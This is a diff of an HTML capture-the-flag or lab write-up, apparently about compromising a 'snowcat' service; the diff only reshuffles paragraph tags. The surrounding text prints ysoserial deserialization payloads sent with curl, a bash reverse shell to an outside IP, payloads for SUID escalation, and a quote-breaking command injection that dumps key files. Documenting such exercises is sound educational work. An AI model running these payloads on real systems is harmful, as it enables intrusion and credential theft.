@@ -94,6 +94,7 @@ Testing identified the CommonsCollections6 gadget could effectively deliver a pa
 <br>
 Payload details:
 <br>
+</p>
 <pre><code class="language-sh">
 java -jar /home/user/ysoserial.jar CommonsCollections6 'touch /tmp/pwned' > payload.bin
 SESSION_ID=$(curl -s -c - http://localhost/ | grep JSESSIONID | awk '{print $7}')
@@ -101,7 +102,7 @@ curl -s -X PUT -H "Content-Length: $(wc -c < payload.bin)" -H "Content-Range: by
 curl -s -H "Cookie: JSESSIONID=.${SESSION_ID}" "http://localhost/" > /dev/null
 ls -la /tmp/pwned 2>/dev/null && echo "SUCCESS with touch!" || echo "Failed"
 </code></pre>
-<br>
+<p>
 The initial payload was delivered and successful:
 <br>
 </p>
@@ -123,14 +124,14 @@ To achieve a remote shell, the following approach was used:
 <p>
 The shell file used was:
 <br>
+</p>
 <pre><code class="language-sh">
 bash -i >& /dev/tcp/69.164.211.205/4444 0>&1
 </code></pre>
-<br>
-</p>
 <p>
 The payload used to set the SUID was:
 <br>
+</p>
 <pre><code class="language-sh">
 java -jar /home/user/ysoserial.jar CommonsCollections6 'chmod u+s /tmp/reverse_shell.sh' > payload.bin
 <!-- Get session ID -->
@@ -140,13 +141,14 @@ curl -s -X PUT -H "Content-Length: $(wc -c < payload.bin)" -H "Content-Range: by
 <!-- Trigger payload -->
 curl -s -H "Cookie: JSESSIONID=.${SESSION_ID}" "http://localhost/" > /dev/null
 </code></pre>
-<br>
+<p>
 Initial payloads failed, due to the payload script completing before the shell was established, killing the shell. Using setsid to detach the shell process from the script, allowed it to establish the connection.
 <br>
 </p>
 <p>
 The payload used setid and ran the shell was:
 <br>
+</p>
 <pre><code class="language-sh">
 java -jar /home/user/ysoserial.jar CommonsCollections6 'setsid bash /tmp/reverse_shell.sh >/dev/null 2>&1 &' > payload.bin
 <!-- Get session ID -->
@@ -156,8 +158,6 @@ curl -s -X PUT -H "Content-Length: $(wc -c < payload.bin)" -H "Content-Range: by
 <!-- Trigger payload -->
 curl -s -H "Cookie: JSESSIONID=.${SESSION_ID}" "http://localhost/" > /dev/null
 </code></pre>
-<br>
-</p>
 <p>
 This resulted in access as the identity running the web service:
 <br>
@@ -205,20 +205,20 @@ The weather user has access to the /usr/local/weather/keys directory. This was o
 <p>
 The following command was injected into the binary command line to create a file containing the contents of the keys folder and change the file permissions:
 <br>
+</p>
 <pre><code class="language-">
 /usr/local/weather/temperature "4b2f3c2d-1f88-4a09-8bd4-d3e5e52e19a6';cat /usr/local/weather/keys/* > /tmp/keys.txt;chmod 644 /tmp/keys.txt;echo '"
 </code></pre>
-<br>
-</p>
 <p>
 Viewing the contents of the file revealed:
 <br>
+</p>
 <pre><code class="language-">
 cat /tmp/keys.txt
 4b2f3c2d-1f88-4a09-8bd4-d3e5e52e19a6
 8ade723d-9968-45c9-9c33-7606c49c2201
 </code></pre>
-<br>
+<p>
 The first key listed is the one used with the temperature binary. The second key is not used by snowcat.
 <br>
 </p>
